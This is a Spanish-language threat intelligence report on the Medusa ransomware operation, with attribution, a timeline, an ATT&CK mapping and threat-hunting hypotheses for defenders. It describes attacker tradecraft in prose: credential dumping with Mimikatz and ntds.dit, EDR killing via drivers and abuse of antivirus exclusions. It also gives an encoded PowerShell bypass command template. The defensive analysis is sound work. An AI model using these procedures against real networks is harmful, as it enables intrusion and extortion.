Esta sección va primero porque es la que evita el error más caro de este expediente, y porque la necesidad de hacerla no es nuestra apreciación: **es el propio FBI el que dedica una frase de su aviso a aclararlo**.

| Designación | Qué es | Relación con esta operación |
|---|---|---|
| **`Medusa` (RaaS)** | **El objeto de este informe.** Operación de extorsión como servicio identificada por primera vez en junio de 2021. Encriptador `gaze.exe` en Windows y `gaze.py` en Linux; extensión `.medusa` | **Es ésta** |
| `MedusaLocker` | Otra familia de ransomware, con su propio historial y sus propios afiliados | **NO guarda relación.** Lo afirma el FBI expresamente en el aviso |
| `Medusa` (malware móvil) | Troyano bancario para Android, también conocido como TangleBot | **NO guarda relación.** Lo afirma el FBI expresamente |
| `MEDUSA` (*rootkit* de Linux) | **Herramienta pública de código abierto**, ya documentada en esta cartera: figura en el grafo de relaciones de este repositorio con el nodo `medusa`, aportado por `CTI-2026-028`, donde se advierte que **su presencia no atribuye** | **NO guarda relación.** Y es la que más probablemente cause confusión aquí, porque **ya está en nuestro propio grafo** |

| Designación | Origen | Grado de equivalencia |
|---|---|---|
| `Medusa actors` | Aviso conjunto | **Término del aviso para desarrolladores y afiliados juntos.** Útil porque no presupone quién hizo qué |
| `gaze.exe` · `gaze.py` | Aviso conjunto | **El encriptador**, en Windows y en Linux. No es un alias del grupo |
| `.medusa` | Aviso conjunto | Extensión de los ficheros cifrados |

> ⚠ **Nota de *tradecraft*, y es una variante nueva del problema habitual.** Los
> informes `CTI-2026-017`, `CTI-2026-022` y `CTI-2026-030` de esta cartera
> existen porque alguien **fusionó dos actores distintos**. Aquí el riesgo es
> distinto y más tonto: **cuatro cosas sin ninguna relación entre sí comparten
> un nombre comercial**, y ninguna de las cuatro lo eligió pensando en las
> otras. El daño potencial es concreto y fácil de imaginar: un analista busca
> «Medusa» en el repositorio de inteligencia propio, encuentra el nodo del
> *rootkit* de Linux aportado por otro informe, y concluye que el hallazgo en
> un servidor Linux es esta operación de extorsión — o al contrario. **La
> desambiguación cuesta una tabla y se hace una vez.** Es `E-g`.

## O-2. Estructura y atribución

| Eje de atribución | Valoración | Confianza |
|---|---|---|
| Clúster técnico | **Establecido.** Encriptador propio con nombre consistente, extensión propia, infraestructura de extorsión propia y conjunto de herramientas estable a través de más de 500 casos | **Alta** |
| Estructura organizativa | **Establecida y con evolución documentada.** Operación **cerrada** hasta al menos principios de 2023 —el mismo grupo controlaba desarrollo y campañas— y **modelo de afiliados** desde entonces, con niveles de confianza según experiencia y rentabilidad | Alta |
| Control central de la negociación | **Establecido:** para afiliados nuevos o menos experimentados, operaciones importantes como la negociación del rescate **las controlan centralmente los desarrolladores** | Alta |
| Nexo estatal | **No planteado por ninguna fuente.** El aviso no lo aborda | — |
| Nacionalidad | **Ninguna fuente pública la establece.** Este informe no la infiere | — |
| Identidad nominal | **Ninguna** | — |
| Cohesión interna | **En duda, y la duda es de la propia fuente.** El caso de `KJ-7` admite dos lecturas: triple extorsión o **disfunción operativa y falta de cohesión** | Baja |

*Razonamiento sobre la estructura, que es lo único que este expediente permite afirmar con solidez:* un modelo que **gradúa la confianza en el afiliado según su rentabilidad** y que **retiene la negociación en el centro para los nuevos** es un modelo que ha tenido problemas con sus propios afiliados. Y el caso de `KJ-7` —un segundo actor del grupo reclamando la mitad del pago porque el negociador se lo quedó— es consistente con eso. **La lectura de disfunción no es menos preocupante que la de triple extorsión: significa que ni siquiera pagando se negocia con una entidad que pueda cumplir lo acordado.**

## O-3. Modelo de operación

### O-3.A — El acceso se compra, y hay tarifa

El aviso describe el mercado con una precisión poco habitual: estos actores **reclutan corredores de acceso inicial en foros y mercados criminales**, y les ofrecen **entre 100 y 1.000.000 de dólares**, además de la posibilidad de trabajar en exclusiva para Medusa. Y añade el dato que importa: **la mayoría de los corredores parece dispuesta a trabajar para varias variantes de ransomware a la vez**.

**Dos consecuencias defensivas que normalmente no se extraen de este dato.** La primera: un acceso a nuestra red, una vez obtenido por un corredor, **puede venderse a más de un comprador**, lo que significa que un incidente de extorsión puede ser seguido por otro de otra operación usando la misma puerta. La segunda: el rango de precio es informativo sobre dónde está nuestro riesgo. Cien dólares es una credencial sacada de un robo masivo de información; un millón es acceso a algo muy grande y muy concreto. **Si nuestra organización vale un millón para un corredor, el adversario invertirá en nosotros; si vale cien dólares, nos alcanzará por accidente.** Las dos situaciones requieren defensas distintas y la mayoría de las organizaciones de la región están en la segunda.

### O-3.B — La entrada, y la frase que invierte la premisa

Tres vías: correos fraudulentos para robar credenciales; explotación de vulnerabilidades sin parchear; y compra de acceso. Las cuatro vulnerabilidades que el aviso nombra están en el Anexo A.1 y tienen un rasgo común que conviene no pasar por alto: **las cuatro son de productos de administración remota, transferencia de ficheros, gestión de dispositivos de seguridad o gestión de accesos privilegiados**. Es decir, **productos de confianza, con privilegios altos y pensados para estar accesibles**.

**Y la frase de `KJ-2`.** El aviso afirma que aprovechan vulnerabilidades recién anunciadas **en menos de 24 horas**, que se les ha observado usar exploits **hasta una semana antes de la divulgación pública**, y que **no hay indicio de que desarrollen capacidad propia**: prefieren obtener acceso anticipado a exploits de fuentes desconocidas. El aviso cita como ejemplo que aprovecharon el anuncio de febrero de 2026 de una vulnerabilidad de un producto de gestión de accesos privilegiados para identificar qué explotar.

### O-3.C — La verificación, que es nuestro mejor regalo

Para comprobar que la explotación ha funcionado, estos actores usan un servicio público de verificación fuera de banda. Envían peticiones HTTP a uno de tres dominios —de la familia `oast`— **embebiendo en el subdominio datos que identifican al anfitrión comprometido**. El aviso da el formato: `<nombre-de-la-víctima>.<33 caracteres alfanuméricos aleatorios>.oast.site`.

> **Por qué esto es el mejor indicador del informe.** Porque el adversario
> necesita que esa consulta **salga de nuestra red y llegue a Internet**, y
> porque **mete nuestro propio nombre en ella**. Una consulta de DNS saliente
> hacia uno de esos tres dominios, con una etiqueta que contenga nuestro nombre
> o el de nuestras marcas, **no tiene explicación legítima** y significa que
> alguien acaba de explotar algo nuestro con éxito y lo está verificando. No es
> una sospecha: es una confirmación, en el momento en que ocurre y antes del
> cifrado. **Es `D-1` y `E-a`.**
>
> **Y la salvedad honesta:** ese servicio es una herramienta legítima de pruebas
> de intrusión, de uso masivo y enteramente lícito. Si la organización contrata
> pruebas de intrusión, **habrá aciertos legítimos**, y por eso la regla exige
> una lista de ventanas de prueba autorizadas. Esa lista es, de todos modos,
> algo que debería existir.

### O-3.D — Dentro: todo legítimo, y nuestras propias excepciones

Una vez dentro, la operación es un catálogo de uso indebido de herramientas legítimas, y conviene enumerarlo porque **ninguna de estas cosas activa una alerta de malware**: escáneres de red comerciales para enumerar; `certutil` para descargar ficheros sin llamar la atención; una biblioteca del propio sistema para volcar las credenciales del proceso de autenticación; PowerShell con **tres niveles crecientes de ofuscación** y borrado del historial de comandos; controladores vulnerables o firmados para **matar o borrar el producto de detección de endpoint**; herramientas públicas de túnel inverso y de monitorización de servidores como canal de mando y control; una interfaz web de administración remota en PHP de **una sola línea**; y **ocho productos comerciales distintos de administración remota**, elegidos —dice el aviso— **adaptándose a las herramientas de acceso remoto que ya están presentes en el entorno de la víctima**.

Y un detalle que merece subrayado porque convierte un control propio en un activo del adversario: **colocan sus herramientas, por ejemplo la de exfiltración, dentro de carpetas ya excluidas de Windows Defender**. No desactivan el antivirus en ese paso: **usan las exenciones que ya habíamos configurado nosotros**. Es `E-e`.

### O-3.E — El final, y por qué la restauración es el problema

El encriptador se despliega con las mismas herramientas con que una organización despliega software: la utilidad de ejecución remota de Sysinternals, o una plataforma comercial de despliegue, o una plataforma de gestión de endpoints. En el caso de la plataforma de despliegue, el aviso describe el guion con detalle: **una orden en PowerShell codificada que excluye la unidad `C:` completa del antivirus**, una copia del encriptador a la carpeta de sistema, y una verificación de que llegó antes de ejecutarlo.

El encriptador **detiene todos los servicios relacionados con copias de seguridad, seguridad, bases de datos, comunicación, compartición de ficheros y sitios web**, borra las instantáneas de volumen, cifra con AES-256 y deja la nota. Después, los actores **apagan remotamente las máquinas virtuales, las cifran, y borran sus propias herramientas**. En entornos Linux usan transferencia segura de ficheros para llevar el encriptador y lo ejecutan desacoplado del terminal; y **usan un perfil de anfitrión de virtualización para cambiar las contraseñas de administrador de las máquinas Linux**.

> **Lo que esa secuencia significa para el plan de continuidad.** No es sólo que
> cifren los datos: **apagan y cifran las máquinas virtuales**, lo que en una
> infraestructura virtualizada moderna significa que se pierde la plataforma y
> no sólo los ficheros; **cambian las contraseñas de administrador del anfitrión
> de virtualización**, lo que significa que el equipo de infraestructura pierde
> el acceso a su propia consola; y **borran sus herramientas al terminar**, lo
> que degrada la investigación posterior. Un plan de recuperación que suponga
> que la plataforma de virtualización estará disponible para restaurar sobre
> ella **no es aplicable a este escenario**. Es `E-h`.

## O-4. Nuestra exposición

> ⬛ **Sección sin evaluar — requiere telemetría e inventario interno.** Las dos
> primeras preguntas se responden hoy y sin herramientas nuevas.

| # | Pregunta | Fuente | Responsable |
|---|---|---|---|
| X-1 | **¿Qué herramientas de administración remota existen en el parque?** No las autorizadas: **las que hay**. El actor elige según lo que encuentra | Inventario de software · EDR | TI/Puesto · SOC |
| X-2 | **¿Cuáles son nuestras exclusiones del antivirus, quién las aprobó y cuándo se revisaron?** | Consola del antivirus | TI/Puesto · Seguridad |
| X-3 | ¿Están vivas las cuatro vulnerabilidades del Anexo A.1? ¿Siguen esos productos expuestos a Internet? | Escaneo externo · inventario | Vulnerabilidades |
| X-4 | ¿Hemos tenido consultas de DNS salientes hacia los dominios de verificación del Anexo A.3 en los últimos 12 meses? **Retrohunt** | DNS | SOC |
| X-5 | ¿Cuánto tardamos realmente desde la publicación de un aviso crítico hasta el parche en producción? **Y la pregunta nueva: ¿qué nos protege durante ese plazo, y qué nos protegería si el exploit llegara antes?** | Métricas · arquitectura | Vulnerabilidades · CISO |
| X-6 | ¿Hay controladores vulnerables conocidos cargables en nuestros equipos? ¿Está activa la lista de bloqueo de controladores vulnerables del fabricante del sistema operativo? | Configuración · EDR | TI/Puesto |
| X-7 | ¿Son nuestras copias de seguridad **inmutables o fuera de línea**? ¿Se ha probado la restauración **suponiendo la plataforma de virtualización perdida y sus credenciales cambiadas**? | Procedimiento · ejercicio | TI · Continuidad |
| X-8 | ¿Está exigida la autenticación multifactor en **todos** los accesos remotos, incluidas las herramientas de administración remota de terceros? | Configuración | Sistemas |
| X-9 | ¿Detectamos el volcado de credenciales del proceso de autenticación local por la vía de la biblioteca del sistema, y no sólo por herramientas conocidas? | EDR | SOC |
| X-10 | ¿Tenemos alerta sobre cambios en la política de dominio por defecto, y sobre su paso a estado «habilitada y forzada»? | Registros de directorio | SOC · Sistemas |
| X-11 | **Política de pago:** ¿existe, la conoce Dirección, y contempla que pagar pueda no cerrar el incidente? | Procedimiento | Dirección · Legal |

## O-5. Cronología

<!-- cti:timeline -->

| Fecha | Hecho | Traza |
|---|---|---|
| `2021-06` | **Primera identificación de la variante Medusa.** Operación **cerrada**: el mismo grupo controla desarrollo y campañas | Global |
| `2023` (principios) | **Paso al modelo de afiliados**, con niveles de confianza según experiencia y rentabilidad, y negociación controlada centralmente para los menos experimentados | Global |
| `2023-10` | Se publica `CVE-2023-48788`, inyección SQL en el gestor de dispositivos de un fabricante de seguridad | Global |
| `2024-02` | Se publica `CVE-2024-1709`, elusión de autenticación en una herramienta de asistencia remota | Global |
| `2025` | Una empresa de telecomunicaciones **venezolana** figura entre las víctimas reivindicadas, según análisis regional | **LATAM** |
| `2025-02` | Estado de la información de la primera versión del aviso: **unas 300 víctimas** | Global |
| `2025-03-12` | **Publicación del aviso conjunto AA25-071A** por el FBI y CISA | Global |
| `2025-09` | Se publica `CVE-2025-10035`, deserialización en un servidor de transferencia de ficheros | Global |
| `2026-02` | **Se publica `CVE-2026-1731`**, inyección de comandos en un producto de gestión de accesos privilegiados. El aviso señala que los actores **aprovecharon ese anuncio para identificar qué explotar** | Global |
| `2026-03` | Un rastreador de sitios de filtración cuenta **508 víctimas**, con Brasil en nueve casos | Global |
| `2026-04` | **Fecha de corte de las investigaciones del FBI que incorpora la actualización: más de 500 víctimas** | Global |
| `2026-08-17` | Otro rastreador cuenta **517 víctimas** | Global |
| `2026-08-18` | **Actualización del aviso conjunto**, con el Departamento de Salud estadounidense **incorporado como cofirmante**. Añade el modelo de afiliados, las tarifas de los corredores, la lista ampliada de vulnerabilidades, la verificación fuera de banda y **la observación del uso de exploits anterior a la divulgación** | Global |
| `2026-11-17` | Emisión de este informe. **Sin ningún dato público localizado sobre víctimas en Colombia, Chile o Perú** | **Chile / LATAM** |

## O-6. Hipótesis alternativas consideradas

<!-- cti:cards -->

| Hipótesis | Argumento y estado | Etiqueta |
|---|---|---|
| **H1 — La selección es oportunista, sin criterio sectorial ni geográfico** | **Afirmado expresamente por la fuente** y coherente con el uso de corredores, con el rango de tarifas y con la distribución de sectores | `Establecida · ≥99 %` |
| **H2 — Hay un canal de suministro de exploits anterior a la divulgación pública** | **Afirmado por la fuente como observación**, con el origen declarado desconocido. Es la hipótesis de más consecuencias del informe y la que menos se puede investigar desde fuera | `Retenida · probable 55–80 %` |
| **H3 — El caso del segundo cobro es triple extorsión por diseño** | Una de las dos lecturas que ofrece la propia fuente. **Un solo caso** | `Retenida · posibilidad real 45–55 %` |
| **H4 — El caso del segundo cobro es disfunción interna** | La otra lectura de la fuente, y la más consistente con un modelo que gradúa la confianza de sus afiliados y retiene la negociación en el centro. **Para la decisión de pago, ambas llevan al mismo sitio** | `Retenida · posibilidad real 45–55 %` |
| **H5 — Colombia está entre los países más golpeados** | **Sin evidencia localizada.** Y los recuentos disponibles proceden de sitios de filtración, que son datos del adversario con sesgo conocido de publicación. Se consigna como descartada **como hallazgo** para que no se reabra | `Descartada como hallazgo · G-3` |
| **H6 — La exposición regional es alta aunque no esté medida** | **Inferencia, no hallazgo.** Si el criterio de selección es el software sin parchear expuesto, la exposición regional es función de esa magnitud, y hay motivos para pensar que es elevada en administración pública y educación superior. **No hay dato** | `Retenida como inferencia · confianza baja` |
| **H7 — Una acción policial detendría la operación** | **Inconsistente con el historial de esta cartera**: `CTI-2026-016` y `CTI-2026-034` documentan dos casos en que la acción no equivalió a cese. Lo esperable es fragmentación y reaparición | `Poco probable · 20–45 %` |

**Supuesto clave.** Que las cuatro vulnerabilidades del Anexo A.1 son representativas del tipo de producto que esta operación va a seguir atacando —administración remota, transferencia de ficheros, gestión de seguridad y accesos privilegiados—. Si es cierto, `E-c` se convierte en una regla permanente de arquitectura: **esas cuatro categorías de producto no deben estar expuestas a Internet**, y cuando lo estén, deben tener la máxima prioridad de parcheo y de doble factor. **Qué se rompe si es falso:** si la operación se desplaza a otras categorías —navegadores, sistemas operativos de servidor, aplicaciones de negocio—, la priorización de `E-c` deja de ser útil, aunque `E-d` seguiría siéndolo.

**Pre-mortem.** Es mayo de 2027 y este informe resultó equivocado. Los tres motivos más probables:

1. **`KJ-2` se leyó como una curiosidad y no como un cambio de premisa.** Es la aportación del informe y también su parte más fácil de ignorar, porque la conclusión es incómoda para quien gestiona el ciclo de parcheo: implica que su métrica principal, aunque esté en verde, no mide todo el riesgo. **Si `E-d` no se dota, este informe habrá descrito una operación de extorsión más.**
2. **`E-b` se hizo a medias.** Inventariar las herramientas de administración remota autorizadas es fácil; **inventariar las que realmente hay** —incluidas las que instaló un proveedor hace tres años, o el propio soporte en un incidente— es otra cosa, y es la que importa, porque el actor elige por mimetismo.
3. **Alguien confundió los Medusa.** El informe advierte de cuatro y pone la tabla, pero el nodo del *rootkit* de Linux sigue en nuestro propio grafo con el nombre `medusa`, y la confusión más probable es interna y no externa.

## O-7. Indicadores y señales de alerta

| # | Indicador observable | Qué señalaría | Disciplina | Responsable |
|---|---|---|---|---|
| I-1 | **Consulta de DNS saliente hacia un dominio de verificación fuera de banda con nuestro nombre en el subdominio** | **No es un indicador de inteligencia: es un incidente en curso.** Explotación confirmada, antes del cifrado | Interna · DNS | SOC |
| I-2 | Publicación de una vulnerabilidad nueva en un producto de administración remota, transferencia de ficheros, gestión de seguridad o accesos privilegiados | Ventana de riesgo abierta **posiblemente desde antes del anuncio**. Parcheo inmediato y vigilancia reforzada | OSINT · avisos de fabricante | Vulnerabilidades |
| I-3 | **Tercera actualización del aviso conjunto** | La segunda cambió juicios de fondo. **Revisión del informe** | OSINT | Célula CTI |
| I-4 | Identificación pública del canal de suministro de exploits anterior a la divulgación | Convierte `H2` en línea de acción. **El desarrollo más importante posible para el panorama completo de extorsión** | OSINT | Célula CTI |
| I-5 | Datos por país de un CSIRT regional sobre esta operación | Resuelve `KJ-5` y `H5` en cualquiera de los dos sentidos | OSINT · CSIRT | Célula CTI |
| I-6 | Acción policial contra la operación | **No esperar cese**: esperar fragmentación y reaparición (`H7`) | OSINT | Célula CTI |
| I-7 | Aparición de un noveno producto de administración remota en los informes | Mantenimiento de la lista de `E-b` | OSINT | Célula CTI |
| I-8 | Un segundo caso documentado de cobro posterior al pago | Discriminaría entre `H3` y `H4`, y reforzaría `E-f` con independencia del resultado | OSINT | Célula CTI |

---

# NIVEL TÁCTICO
### Para: Analistas de SOC · Ingeniería de Detección · Threat Hunting · Horizonte: días–semanas

## T-1. Cadena de intrusión

<!-- cti:stages title="Tres etapas, y la tercera deja a la organización sin plataforma, no sólo sin ficheros" dwell="next" -->

| Etapa | Título | Elementos |
|---|---|---|
| Etapa 01 · Borde | Comprar la puerta, o empujar la que aún no tiene parche | corredores de acceso inicial pagados **entre 100 y 1.000.000 $** · correos fraudulentos · **4 CVE de productos de administración remota, transferencia de ficheros, gestión de seguridad y accesos privilegiados** · explotación **en menos de 24 h** desde el anuncio y **hasta una semana antes de la divulgación** · **verificación fuera de banda con el nombre de la víctima en el subdominio** |
| Etapa 02 · Dominio | Nuestras propias herramientas, y nuestras propias excepciones | escáneres de red comerciales · `certutil` para descargar · **PowerShell con tres niveles de ofuscación** y borrado del historial · volcado de credenciales con una biblioteca del sistema · **Mimikatz** y `mimilib.dll` → `kiwissp.log` · instantánea de volumen → `ntds.dit` → **billetes Kerberos falsificados** · **controladores vulnerables o firmados para matar el EDR** · **herramientas colocadas en carpetas ya excluidas del antivirus** · **8 productos de administración remota elegidos por mimetismo** · `openrdp.bat` · **política de dominio por defecto puesta en «habilitada y forzada»** |
| Etapa 03 · Impacto | No cifran ficheros: cifran la plataforma | `Bandizip` + `Rclone` renombrado a `lsp.exe` con su configuración a `ngconf.txt` · exfiltración de lotes pequeños por el **portapapeles de escritorio remoto** · despliegue del encriptador con la **plataforma de despliegue de software** · **exclusión de la unidad `C:` completa del antivirus** · `gaze.exe` detiene servicios de copia, seguridad, bases de datos y web · borra instantáneas · **AES-256**, extensión `.medusa` · **apaga las máquinas virtuales y las cifra** · **cambia las contraseñas de administrador del anfitrión de virtualización** · borra sus propias herramientas |

**Permanencia:** el aviso no publica mediana. **Pero publica algo más útil para dimensionar la urgencia:** que aprovechan un anuncio de vulnerabilidad **en menos de veinticuatro horas**. Esa cifra no mide permanencia sino **velocidad de entrada**, y es la que conviene llevar a la discusión del plazo de parcheo. El plazo real de que disponemos tras un aviso crítico de uno de los cuatro tipos de producto del Anexo A.1 **es de un día**, y para algunos casos **fue negativo**.

**Y la observación que ordena la defensa de esta cadena.** Las tres etapas usan, casi en su totalidad, software legítimo: productos comerciales de administración remota, utilidades del sistema operativo, herramientas públicas de GitHub, plataformas de despliegue de software que la propia organización ya tiene, y **las exclusiones del antivirus que la propia organización configuró**. Lo único específico del adversario es el encriptador y una interfaz web de administración remota de una línea. **Una defensa construida sobre el reconocimiento de software malicioso ve esta cadena entera sólo en su último paso**, cuando ya no sirve.

## T-2. Mapa MITRE ATT&CK

El aviso publica su propio mapeo sobre **ATT&CK v19**, con los identificadores citados en el propio texto. Se recogen tal cual; las filas de mapeo propio se declaran.

<!-- cti:matrix -->

| Táctica | ID | Técnica | Procedimiento observado |
|---|---|---|---|
| Acceso inicial | T1566 | Phishing | Campañas de correo fraudulento como método principal de robo de credenciales |
| Acceso inicial | T1190 | Exploit Public-Facing Application | Las cuatro vulnerabilidades del Anexo A.1, **explotadas en menos de 24 h desde el anuncio y hasta una semana antes de la divulgación** |
| Acceso inicial | T1078 | Valid Accounts | Acceso comprado a corredores de acceso inicial *(mapeo propio)* |
| Reconocimiento | T1595 | Active Scanning | **Uso de un servicio público de verificación fuera de banda** para confirmar la explotación, con el nombre de la víctima en el subdominio *(mapeo propio: el aviso describe el procedimiento sin asignarle identificador)* |
| Descubrimiento | T1046 | Network Service Discovery | Escáneres comerciales de red. Puertos habituales: 21, 22, 23, 80, 115, 443, 1433, 3050, 3128, 3306, 3389 |
| Descubrimiento | T1083 | File and Directory Discovery | Enumeración del sistema de ficheros con PowerShell y la consola de comandos |
| Ejecución | T1059.001 | PowerShell | Enumeración, transferencia de herramientas y **tres niveles crecientes de ofuscación** |
| Ejecución | T1059.003 | Windows Command Shell | Enumeración y ejecución |
| Ejecución | T1047 | Windows Management Instrumentation | Consulta de información del sistema |
| Ejecución | T1105 | Ingress Tool Transfer | `certutil` para descargar ficheros **evitando la detección** |
| Defensa | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | `powershell -exec bypass -enc <cadena en base64>` |
| Defensa | T1027 | Obfuscated Files or Information | **Troceado de la cadena de descarga** y referencia por variable; carga en base64 descomprimida en memoria y convertida en bloque de guion, con operador de formato y reemplazos de carácter |
| Defensa | T1070.003 | Indicator Removal: Clear Command History | **Borrado del historial de comandos de PowerShell** |
| Defensa | T1685 | *(Impair Defenses)* | **Uso de controladores vulnerables o firmados para matar o borrar el producto de detección de endpoint** |
| Defensa | T1564.012 | Hide Artifacts: File/Path Exclusions | **Colocación de herramientas, como la de exfiltración, dentro de carpetas ya excluidas de Windows Defender** |
| Defensa | T1070 | Indicator Removal | Borrado de las propias herramientas al terminar |
| Defensa | T1006 | Direct Volume Access | **Instantánea de volumen para copiar `ntds.dit` y los *hives* de registro, y borrado de la instantánea** para evitar su descubrimiento |
| Credenciales | T1003.001 | OS Credential Dumping: LSASS Memory | **Mimikatz, el administrador de tareas de Windows y una biblioteca del sistema** para volcar el proceso de autenticación local. **Desactivan el antivirus durante la exfiltración y lo reactivan al terminar** |
| Credenciales | T1558 | Steal or Forge Kerberos Tickets | **Billetes Kerberos falsificados** a partir de los ficheros robados: compromiso del dominio completo |
| Movimiento lateral | T1021.001 | Remote Services: Remote Desktop Protocol | `openrdp.bat`: regla de cortafuegos para el puerto 3389, regla para conexiones remotas de gestión, y modificación del registro para permitir escritorio remoto |
| Movimiento lateral | T1569.002 | System Services: Service Execution | **PsExec** para copiar y ejecutar guiones con privilegios de sistema |
| Movimiento lateral | T1219 | Remote Access Tools | **Ocho productos comerciales**, elegidos **adaptándose a los que ya hay en el entorno** |
| Movimiento lateral | T1072 | Software Deployment Tools | **Despliegue del encriptador con la plataforma de despliegue de software de la propia víctima** |
| Privilegios | T1484.001 | Domain Policy Modification: Group Policy Modification | **Política de dominio por defecto puesta en «habilitada y forzada»** para sobreescribir políticas más estrictas |
| Mando y control | T1071.001 | Application Layer Protocol: Web Protocols | Guion público de etapa que crea consola inversa o de escucha sobre TLS en el puerto 443 |
| Exfiltración | T1567.002 | Exfiltration to Cloud Storage | **`Rclone`** hacia los servidores del grupo, **renombrado** junto a su configuración |
| Impacto | T1489 | Service Stop | El encriptador detiene **todos** los servicios de copia, seguridad, bases de datos, comunicación, compartición y web |
| Impacto | T1529 | System Shutdown/Reboot | **Apagado remoto de las máquinas virtuales antes de cifrarlas** |
| Impacto | T1675 | *(ESXi Administration Command)* | **Perfil de anfitrión de virtualización para cambiar las contraseñas de administrador** de las máquinas Linux |
| Impacto | T1486 | Data Encrypted for Impact | `gaze.exe` en Windows, `gaze.py` en Linux. **AES-256**, extensión `.medusa` |
| Impacto | T1657 | Financial Theft | Doble extorsión; venta de los datos a terceros antes de que expire el reloj; **10.000 $ por añadir un día** |

> **Tres filas de esta tabla son las que un plan de respuesta suele no
> contemplar, y conviene mirarlas juntas:** `T1529`, el apagado y cifrado de
> las máquinas virtuales; `T1675`, el cambio de las contraseñas de
> administrador del anfitrión de virtualización; y `T1072`, el uso de **nuestra
> propia plataforma de despliegue de software** para distribuir el encriptador.
> Las tres describen la misma idea: **el adversario no ataca los datos, ataca
> la capacidad de recuperarlos**. Un plan que suponga disponible la consola de
> virtualización, o que suponga que la plataforma de despliegue es un activo
> propio y no del atacante, no es aplicable a este escenario. Es `E-h`.

## T-3. Dónde atacamos en la Pirámide del Dolor

<!-- cti:pyramid -->

| Nivel | Qué contiene en este informe y qué vale | Valor |
|---|---|---|
| Hashes | El aviso publica varios, y hay un problema de higiene que esta cartera señala cada vez: **una parte son MD5 y SHA-1**, no sólo SHA-256. Valor preventivo nulo contra un encriptador que se recompila. **Solo retrohunt** | Base · valor trivial |
| IP · Dominios | Unas veinte direcciones y varias URL. **Y el propio aviso advierte que algunos indicadores pueden ser legítimos y pide verificarlos antes de bloquear**: en la lista hay direcciones de un proveedor comercial de VPN y de proveedores de nube. **Cargar esta lista sin filtrar provocará cortes propios** | Valor bajo · **y con riesgo de autolesión** |
| Artefactos | **Rentable y abundante:** `kiwissp.log`, el valor de registro de paquetes de seguridad con la biblioteca de Mimikatz, `openrdp.bat`, los nombres `lsp.exe` y `ngconf.txt`, la extensión `.medusa`, los guiones `RunFileCopy.cmd` y `command.cmd`, y la interfaz web de una línea con su clave fija | Valor medio · **empezar aquí** |
| Herramientas | `certutil`, PowerShell, WMI, PsExec, Mimikatz, Rclone, Bandizip, escáneres comerciales, túnel inverso, exposición de servicios por nube, monitorización de servidores, agente de gestión de endpoints, **ocho productos de administración remota** y **nuestra propia plataforma de despliegue**. Todo legítimo o público | Valor alto |
| TTP | **Tres, y la primera no es un comportamiento del adversario sino una condición del entorno.** (1) **Explotación de productos de administración, transferencia y acceso privilegiado expuestos, con ventana que puede abrirse antes del parche.** (2) **Mimetismo con la herramienta de administración remota ya presente.** (3) **Verificación fuera de banda con el nombre de la víctima en la consulta de DNS** — que es, excepcionalmente, una TTP que **nos favorece** | Cima · valor máximo |

> **Y una conclusión sobre el nivel más bajo que conviene decir en voz alta,
> porque es la advertencia de la portada de este repositorio aplicada a un caso
> concreto.** El aviso incluye entre sus indicadores direcciones de **un
> proveedor comercial de VPN** —el actor las usó para acceder a una interfaz web
> de administración remota— y de proveedores de nube reasignables. **Bloquear
> esas direcciones significa bloquear a usuarios legítimos de ese proveedor de
> VPN, que pueden ser nuestros propios empleados o nuestros clientes.** El
> descargo del aviso no es una fórmula de cortesía: es la instrucción de uso, y
> el Anexo A de este informe la hereda fila por fila.

## T-4. Hipótesis de caza prioritarias

<!-- cti:accordion critical="^(H-1|H-2|H-3)\b" regional="^H-1[0-2]\b" -->

**H-1 — Alguien verificó un exploit contra nosotros, y dejó nuestro nombre en una consulta de DNS.** La caza de mayor valor y menor coste de todo el informe, y la única que detecta **explotación confirmada antes del cifrado**. Buscar en los registros de DNS cualquier consulta saliente hacia los tres dominios de verificación del Anexo A.3. El formato documentado es una etiqueta con el **nombre de la víctima**, seguida de treinta y tres caracteres alfanuméricos aleatorios, seguida del dominio. **Dos búsquedas, y la segunda es la buena:** por dominio, que da todos los aciertos; y por **nuestro propio nombre, el de nuestras marcas y el de nuestros dominios** como subcadena en cualquier consulta saliente, que da los aciertos que de verdad nos conciernen. Fidelidad: **muy alta**. Falso positivo conocido y único: **pruebas de intrusión legítimas**, porque ese servicio es una herramienta estándar del oficio; de ahí que la regla exija una lista de ventanas de prueba autorizadas, que debería existir de todos modos. Ventana: 12 meses hacia atrás, permanente hacia delante.

**H-2 — Hay una herramienta de administración remota en el parque que nadie autorizó.** La caza que cierra el vector de movimiento lateral preferente. Buscar en el inventario de software y en la telemetría de proceso los ocho productos que el aviso nombra **y cualquier otro de la misma categoría**; y contrastar con la lista de los autorizados. **El discriminador no es el producto: es la autorización**, porque el actor elige deliberadamente el que ya está en el entorno. Señales de prioridad: una herramienta presente en **un solo equipo**; una instalada fuera de la ventana de cambios; una cuyo servicio se registró hace pocos días en un servidor. Fidelidad: alta como auditoría. **Y el resultado más probable no es un atacante: es descubrir tres herramientas que instaló un proveedor y nadie retiró** — que es exactamente el material con el que este adversario trabaja.

**H-3 — Nuestras exclusiones del antivirus contienen algo.** Pequeña, incómoda y de altísimo rendimiento. El actor **coloca sus herramientas dentro de carpetas ya excluidas de Windows Defender**. Cazar: volcar la lista de exclusiones de ruta, de proceso y de extensión de todo el parque; **y después mirar qué hay realmente dentro de esas carpetas**. Señales: ejecutables en una carpeta excluida que se creó para una base de datos; exclusiones de la unidad completa; exclusiones sin dueño ni fecha ni justificación. Fidelidad: muy alta. **Y un hallazgo adicional casi garantizado:** la lista de exclusiones de una organización mediana suele tener entradas que nadie puede explicar, y cada una es una carpeta donde este adversario y cualquier otro pueden trabajar sin ser vistos. Es `E-e`.

**H-4 — Alguien escribió en el registro un paquete de seguridad que no es de Microsoft.** Indicador muy específico y muy concluyente. El actor añade la biblioteca de Mimikatz a la lista de paquetes de seguridad del subsistema de autenticación, lo que hace que las contraseñas en claro se registren en un fichero del directorio de sistema. Cazar: modificaciones del valor de paquetes de seguridad de la autoridad de seguridad local, y **la existencia del fichero de registro resultante**. Fidelidad: **muy alta**; no hay uso legítimo. Es `D-3`.

**H-5 — Se creó y se borró una instantánea de volumen, y en medio se copió la base del directorio.** La secuencia completa de robo de credenciales de dominio en tres pasos: creación de la instantánea, copia de `ntds.dit` y de los *hives* de registro, y borrado de la instantánea para que no quede rastro. Cazar los tres eventos correlacionados en una ventana corta en un controlador de dominio. Fidelidad: muy alta. **Si esta caza acierta, hay que asumir compromiso del dominio completo y billetes Kerberos falsificables**, y la respuesta incluye la rotación de la clave de la cuenta de servicio del directorio **dos veces**.

